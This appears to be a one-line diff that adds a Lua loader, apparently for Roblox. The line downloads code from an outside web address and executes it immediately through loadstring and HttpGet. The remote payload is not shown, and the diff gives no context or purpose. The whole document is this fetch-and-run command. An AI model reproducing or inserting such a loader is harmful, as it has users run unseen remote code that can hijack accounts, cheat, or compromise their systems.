@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://r4-sec.vercel.app/files/baa0f3e69302492e76990c59c900a858"))()
